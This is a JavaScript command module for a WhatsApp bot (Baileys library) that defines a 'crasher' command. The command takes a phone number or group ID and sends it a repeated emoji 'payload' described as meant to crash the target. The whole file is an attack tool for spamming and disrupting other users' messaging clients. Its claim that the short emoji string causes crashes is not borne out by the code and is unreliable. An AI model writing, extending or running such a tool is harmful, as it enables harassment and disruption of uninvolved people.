
export default {
  name: "crasher",
  description: "Send dangerous emoji spam payload to crash target",
  async execute(msg, { sock, args }) {
    try {
      let target = args[0];

      if (!target) {
        return sock.sendMessage(msg.key.remoteJid, {
          text: `⚠️ Usage: ?crasher <number/group>\n\nExample:\n?crasher 234XXXXXXXXXX\n?crasher 120XXXXXXX@g.us`
        });
      }

      // Format target
      if (!target.includes("@g.us") && !target.includes("@s.whatsapp.net")) {
        if (target.length < 11) {
          return sock.sendMessage(msg.key.remoteJid, { 
            text: "⚠️ Invalid number. Use format: 234XXXXXXXXXX" 
          });
        }
        target = target + "@s.whatsapp.net";
      }

      console.log(`[INFO] Executing crasher on target: ${target}`);

      const dangerousEmoji = "🩸🕸️🕷️🖤🩸🕸️🕷️🖤";
      
      // Construct payload (50 times only for safety test)
      let spamPayload = dangerousEmoji.repeat(50);
      
      // Function to send it via Baileys (safe: not displayed locally)
      async function sendSpamMessage(sock, jid) {
        try {
          await sock.sendMessage(jid, { text: spamPayload });
          console.log("✅ Spam payload sent (not displayed locally).");
        } catch (e) {
          console.error("❌ Failed to send:", e);
          throw e;
        }
      }

      // Send the spam message
      await sendSpamMessage(sock, target);

      await sock.sendMessage(msg.key.remoteJid, {
        text: `✅ Crasher payload sent to ${target}!\nPayload size: ${spamPayload.length} characters`
      });

    } catch (error) {
      console.error(`[ERROR] Crasher command failed:`, error);
      await sock.sendMessage(msg.key.remoteJid, {
        text: "❌ Failed to send crasher: " + error.message
      });
    }
  }
};
